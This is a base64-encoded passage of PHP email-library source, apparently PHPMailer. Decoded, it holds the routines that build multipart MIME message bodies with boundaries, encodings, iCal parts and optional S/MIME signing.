GUgbWVzc2FnZSBib2R5LgogICAgICogUmV0dXJucyBhbiBlbXB0eSBzdHJpbmcgb24gZmFpbHVyZS4KICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nIFRoZSBhc3NlbWJsZWQgbWVzc2FnZSBib2R5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjcmVhdGVCb2R5KCkKICAgIHsKICAgICAgICAkYm9keSA9ICcnOwogICAgICAgIC8vQ3JlYXRlIHVuaXF1ZSBJRHMgYW5kIHByZXNldCBib3VuZGFyaWVzCiAgICAgICAgJHRoaXMtPnVuaXF1ZWlkID0gJHRoaXMtPmdlbmVyYXRlSWQoKTsKICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMV0gPSAnYjFfJyAuICR0aGlzLT51bmlxdWVpZDsKICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMl0gPSAnYjJfJyAuICR0aGlzLT51bmlxdWVpZDsKICAgICAgICAkdGhpcy0+Ym91bmRhcnlbM10gPSAnYjNfJyAuICR0aGlzLT51bmlxdWVpZDsKICAgICAgICBpZiAoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpIHsKICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldE1haWxNSU1FKCkgLiBzdGF0aWM6OiRMRTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPnNldFdvcmRXcmFwKCk7CiAgICAgICAgJGJvZHlFbmNvZGluZyA9ICR0aGlzLT5FbmNvZGluZzsKICAgICAgICAkYm9keUNoYXJTZXQgPSAkdGhpcy0+Q2hhclNldDsKICAgICAgICAvL0NhbiB3ZSBkbyBhIDctYml0IGRvd25ncmFkZT8KICAgICAgICBpZiAoc3RhdGljOjpFTkNPRElOR184QklUID09ICRib2R5RW5jb2RpbmcgYW5kICEkdGhpcy0+aGFzOGJpdENoYXJzKCR0aGlzLT5Cb2R5KSkgewogICAgICAgICAgICAkYm9keUVuY29kaW5nID0gc3RhdGljOjpFTkNPRElOR183QklUOwogICAgICAgICAgICAvL0FsbCBJU08gODg1OSwgV2luZG93cyBjb2RlcGFnZSBhbmQgVVRGLTggY2hhcnNldHMgYXJlIGFzY2lpIGNvbXBhdGlibGUgdXAgdG8gNy1iaXQKICAgICAgICAgICAgJGJvZHlDaGFyU2V0ID0gJ3VzLWFzY2lpJzsKICAgICAgICB9CiAgICAgICAgLy9JZiBsaW5lcyBhcmUgdG9vIGxvbmcsIGFuZCB3ZSdyZSBub3QgYWxyZWFkeSB1c2luZyBhbiBlbmNvZGluZyB0aGF0IHdpbGwgc2hvcnRlbiB0aGVtLAogICAgICAgIC8vY2hhbmdlIHRvIHF1b3RlZC1wcmludGFibGUgdHJhbnNmZXIgZW5jb2RpbmcgZm9yIHRoZSBib2R5IHBhcnQgb25seQogICAgICAgIGlmIChzdGF0aWM6OkVOQ09ESU5HX0JBU0U2NCAhPSAkdGhpcy0+RW5jb2RpbmcgYW5kIHN0YXRpYzo6aGFzTGluZUxvbmdlclRoYW5NYXgoJHRoaXMtPkJvZHkpKSB7CiAgICAgICAgICAgICRib2R5RW5jb2RpbmcgPSBzdGF0aWM6OkVOQ09ESU5HX1FVT1RFRF9QUklOVEFCTEU7CiAgICAgICAgfQogICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSAkdGhpcy0+RW5jb2Rpbmc7CiAgICAgICAgJGFsdEJvZHlDaGFyU2V0ID0gJHRoaXMtPkNoYXJTZXQ7CiAgICAgICAgLy9DYW4gd2UgZG8gYSA3LWJpdCBkb3duZ3JhZGU/CiAgICAgICAgaWYgKHN0YXRpYzo6RU5DT0RJTkdfOEJJVCA9PSAkYWx0Qm9keUVuY29kaW5nIGFuZCAhJHRoaXMtPmhhczhiaXRDaGFycygkdGhpcy0+QWx0Qm9keSkpIHsKICAgICAgICAgICAgJGFsdEJvZHlFbmNvZGluZyA9IHN0YXRpYzo6RU5DT0RJTkdfN0JJVDsKICAgICAgICAgICAgLy9BbGwgSVNPIDg4NTksIFdpbmRvd3MgY29kZXBhZ2UgYW5kIFVURi04IGNoYXJzZXRzIGFyZSBhc2NpaSBjb21wYXRpYmxlIHVwIHRvIDctYml0CiAgICAgICAgICAgICRhbHRCb2R5Q2hhclNldCA9ICd1cy1hc2NpaSc7CiAgICAgICAgfQogICAgICAgIC8vSWYgbGluZXMgYXJlIHRvbyBsb25nLCBhbmQgd2UncmUgbm90IGFscmVhZHkgdXNpbmcgYW4gZW5jb2RpbmcgdGhhdCB3aWxsIHNob3J0ZW4gdGhlbSwKICAgICAgICAvL2NoYW5nZSB0byBxdW90ZWQtcHJpbnRhYmxlIHRyYW5zZmVyIGVuY29kaW5nIGZvciB0aGUgYWx0IGJvZHkgcGFydCBvbmx5CiAgICAgICAgaWYgKHN0YXRpYzo6RU5DT0RJTkdfQkFTRTY0ICE9ICRhbHRCb2R5RW5jb2RpbmcgYW5kIHN0YXRpYzo6aGFzTGluZUxvbmdlclRoYW5NYXgoJHRoaXMtPkFsdEJvZHkpKSB7CiAgICAgICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSBzdGF0aWM6OkVOQ09ESU5HX1FVT1RFRF9QUklOVEFCTEU7CiAgICAgICAgfQogICAgICAgIC8vVXNlIHRoaXMgYXMgYSBwcmVhbWJsZSBpbiBhbGwgbXVsdGlwYXJ0IG1lc3NhZ2UgdHlwZXMKICAgICAgICAkbWltZXByZSA9ICdUaGlzIGlzIGEgbXVsdGktcGFydCBtZXNzYWdlIGluIE1JTUUgZm9ybWF0LicgLiBzdGF0aWM6OiRMRTsKICAgICAgICBzd2l0Y2ggKCR0aGlzLT5tZXNzYWdlX3R5cGUpIHsKICAgICAgICAgICAgY2FzZSAnaW5saW5lJzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGJvZHlDaGFyU2V0LCAnJywgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49IHN0YXRpYzo6JExFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnaW5saW5lJywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhdHRhY2gnOgogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYm9keUNoYXJTZXQsICcnLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdpbmxpbmVfYXR0YWNoJzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsIHN0YXRpYzo6Q09OVEVOVF9UWVBFX01VTFRJUEFSVF9SRUxBVEVEIC4gJzsnKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYm9keUNoYXJTZXQsICcnLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbMl0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHQnOgogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYWx0Qm9keUNoYXJTZXQsIHN0YXRpYzo6Q09OVEVOVF9UWVBFX1BMQUlOVEVYVCwgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5BbHRCb2R5LCAkYWx0Qm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49IHN0YXRpYzo6JExFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGJvZHlDaGFyU2V0LCBzdGF0aWM6OkNPTlRFTlRfVFlQRV9URVhUX0hUTUwsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJHRoaXMtPkljYWwpKSB7CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJycsIHN0YXRpYzo6Q09OVEVOVF9UWVBFX1RFWFRfQ0FMRU5EQVIgLiAnOyBtZXRob2Q9UkVRVUVTVCcsICcnKTsKICAgICAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5JY2FsLCAkdGhpcy0+RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgICAgICRib2R5IC49IHN0YXRpYzo6JExFOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZSc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRhbHRCb2R5Q2hhclNldCwgc3RhdGljOjpDT05URU5UX1RZUEVfUExBSU5URVhULCAkYWx0Qm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgc3RhdGljOjpDT05URU5UX1RZUEVfTVVMVElQQVJUX1JFTEFURUQgLiAnOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciJyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICRib2R5Q2hhclNldCwgc3RhdGljOjpDT05URU5UX1RZUEVfVEVYVF9IVE1MLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbMl0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHRfYXR0YWNoJzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsIHN0YXRpYzo6Q09OVEVOVF9UWVBFX01VTFRJUEFSVF9BTFRFUk5BVElWRSAuICc7Jyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzJdIC4gJyInKTsKICAgICAgICAgICAgICAgICRib2R5IC49IHN0YXRpYzo6JExFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGFsdEJvZHlDaGFyU2V0LCBzdGF0aWM6OkNPTlRFTlRfVFlQRV9QTEFJTlRFWFQsICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICRib2R5Q2hhclNldCwgc3RhdGljOjpDT05URU5UX1RZUEVfVEVYVF9IVE1MLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5JY2FsKSkgewogICAgICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICcnLCBzdGF0aWM6OkNPTlRFTlRfVFlQRV9URVhUX0NBTEVOREFSIC4gJzsgbWV0aG9kPVJFUVVFU1QnLCAnJyk7CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+SWNhbCwgJHRoaXMtPkVuY29kaW5nKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCBzdGF0aWM6OkNPTlRFTlRfVFlQRV9NVUxUSVBBUlRfQUxURVJOQVRJVkUgLiAnOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciJyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICRhbHRCb2R5Q2hhclNldCwgc3RhdGljOjpDT05URU5UX1RZUEVfUExBSU5URVhULCAkYWx0Qm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsyXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgc3RhdGljOjpDT05URU5UX1RZUEVfTVVMVElQQVJUX1JFTEFURUQgLiAnOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVszXSAuICciJyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbM10sICRib2R5Q2hhclNldCwgc3RhdGljOjpDT05URU5UX1RZUEVfVEVYVF9IVE1MLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbM10pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdKTsKICAgICAgICAgICAgICAgICRib2R5IC49IHN0YXRpYzo6JExFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnYXR0YWNobWVudCcsICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIC8vIENhdGNoIGNhc2UgJ3BsYWluJyBhbmQgY2FzZSAnJywgYXBwbGllcyB0byBzaW1wbGUgYHRleHQvcGxhaW5gIGFuZCBgdGV4dC9odG1sYCBib2R5IGNvbnRlbnQgdHlwZXMKICAgICAgICAgICAgICAgIC8vUmVzZXQgdGhlIGBFbmNvZGluZ2AgcHJvcGVydHkgaW4gY2FzZSB3ZSBjaGFuZ2VkIGl0IGZvciBsaW5lIGxlbmd0aCByZWFzb25zCiAgICAgICAgICAgICAgICAkdGhpcy0+RW5jb2RpbmcgPSAkYm9keUVuY29kaW5nOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJHRoaXMtPkVuY29kaW5nKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgewogICAgICAgICAgICAkYm9keSA9ICcnOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2VtcHR5X21lc3NhZ2UnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2VpZiAoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmICghZGVmaW5lZCgnUEtDUzdfVEVYVCcpKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXh0ZW5zaW9uX21pc3NpbmcnKSAuICdvcGVuc3NsJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkZmlsZSA9IGZvcGVuKCdwaHA6Ly90ZW1wJywgJ3JiKycpOwogICAgICAgICAgICAgICAgJHNpZ25lZCA9IGZvcGVuKCdwaHA6Ly90ZW1wJywgJ3JiKycpOwogICAgICAgICAgICAgICAgZndyaXRlKCRmaWxlLCAkYm9keSk7CiAgICAgICAgICAgICAgICAvL1dvcmthcm91bmQgZm9yIFBIUCBidWcgaHR0cHM6Ly9idWdzLnBocC5uZXQvYnVnLnBocD9pZD02OTE5NwogICAgICAgICAgICAgICAgaWYgKGVtcHR5KCR0aGlzLT5zaWduX2V4dHJhY2VydHNfZmlsZSkpIHsKICAgICAgICAgICAgICAgICAgICAkc2lnbiA9IEBvcGVuc3NsX3BrY3M3X3NpZ24oCiAgICAgICAgICAgICAgICAgICAgICAgICRmaWxlLAogICAgICAgICAgICAgICAgICAgICAgICAkc2lnbmVkLAogICAgICAgICAgICAgICAgICAgICAgICAnZmlsZTovLycgLiByZWFscGF0aCgkdGhpcy0+c2lnbl9jZXJ0X2ZpbGUpLAogICAgICAgICAgICAgICAgICAgICAgICBbJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpLCAkdGhpcy0+c2lnbl9rZXlfcGFzc10sCiAgICAgICAgICAgICAgICAgICAgICAgIFtdCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJHNpZ24gPSBAb3BlbnNzbF9wa2NzN19zaWduKAogICAgICAgICAgICAgICAgICAgICAgICAkZmlsZSwKICAgICAgICAgICAgICAgICAgICAgICAgJHNpZ25lZCwKICAgICAgICAgICAgICAgICAgICAgICAgJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fY2VydF9maWxlKSwKICAgICAgICAgICAgICAgICAgICAgICAgWydmaWxlOi8vJyAuIHJlYWxwYXRoKCR0aGlzLT5zaWduX2tleV9maWxlKSwgJHRoaXMtPnNpZ25fa2V5X3Bhc3NdLAogICAgICAgICAgICAgICAgICAgICAgICBbXSwKICAgICAgICAgICAgICAgICAgICAgICAgUEtDUzdfREVUQUNIRUQsCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5zaWduX2V4dHJhY2VydHNfZmlsZQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBmY2xvc2UoJGZpbGUpOwogICAgICAgICAgICAgICAgaWYgKCRzaWduKSB7CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgPSBmaWxlX2dldF9jb250ZW50cygkc2lnbmVkKTsKICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJHNpZ25lZCk7CiAgICAgICAgICAgICAgICAgICAgLy9UaGUgbWVzc2FnZSByZXR1cm5lZCBieSBvcGVuc3NsIGNvbnRhaW5zIGJvdGggaGVhZGVycyBhbmQgYm9keSwgc28gbmVlZCB0byBzcGxpdCB0aGVtIHVwCiAgICAgICAgICAgICAgICAgICAgJHBhcnRzID0gZXhwbG9kZSgiXG5cbiIsICRib2R5LCAyKTsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciAuPSAkcGFydHNbMF0gLiBzdGF0aWM6OiRMRSAuIHN0YXRpYzo6JExFOwogICAgICAgICAgICAgICAgICAgICRib2R5ID0gJHBhcnRzWzFdOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJHNpZ25lZCk7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnc2lnbmluZycpIC4gb3BlbnNzbF9lcnJvcl9zdHJpbmcoKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICAgICAkYm9keSA9ICcnOwogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJGJvZHk7CiAgICB9CiAgICAvKioKICAgICAqIFJldHVybiB0aGUgc3RhcnQgb2YgYSBtZXNzYWdlIGJvdW5kYXJ5LgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvdW5kYXJ5CiAgICAgKiBAcGFyYW0gc3RyaW5nICRjaGFyU2V0CiAgICAgKiBAcGFyYW0gc3RyaW5nICRjb250ZW50VHlwZQogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0Qm91bmRhcnkoJGJvdW5kYXJ5LCAkY2hhclNldCwgJGNvbnRlbnRUeXBlLCAkZW5jb2RpbmcpCiAgICB7CiAgICAgICAgJHJlc3VsdCA9ICcnOwogICAgICAgIGlmICgnJyA9PSAkY2hhclNldCkgewogICAgICAgICAgICAkY2hhclNldCA9ICR0aGlzLT5DaGFyU2V0OwogICAgICAgIH0KICAgICAgICBpZiAoJycgPT0gJGNvbnRlbnRUeXBlKSB7CiAgICAgICAgICAgICRjb250ZW50VHlwZSA9ICR0aGlzLT5Db250ZW50VHlwZTsKICAgICAgICB9CiAgICAgICAgaWYgKCcnID09ICRlbmNvZGluZykgewogICAgICAgICAgICAkZW5jb2RpbmcgPSAkdGhpcy0+RW5jb2Rpbmc7CiAgICAgICAgfQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkYm91bmRhcnkpOwogICAgICAgICRyZXN1bHQgLj0gc3ByaW50ZignQ29udGVudC1UeXBlOiAlczsgY2hhcnNldD0lcycsICRjb250ZW50VHlwZSwgJGNoYXJTZXQpOwogICAgICAgICRyZXN1bHQgLj0gc3RhdGljOjokTEU7CiAgICAgICAgLy8gUkZDMTM0MSBwYXJ0IDUgc2F5cyA3Yml0IGlzIGFzc3VtZWQgaWYgbm90IHNwZWNpZmllZAogICAgICAgIGlmIChzdGF0aWM6OkVOQ09ESU5HXzdCSVQgIT0gJGVuY29kaW5nKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmcnLCAkZW5jb2RpbmcpOwogICAgICAgIH0KICAgICAgICAkcmVzdWx0IC49IHN0YXRpYzo6JExFOwogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQogICAgLyoqCiAgICAgKiBSZXR1cm4gdGhlIGVuZCBvZiBhIG1lc3NhZ2UgYm91bmRhcnkuCiAgICAgKgogICA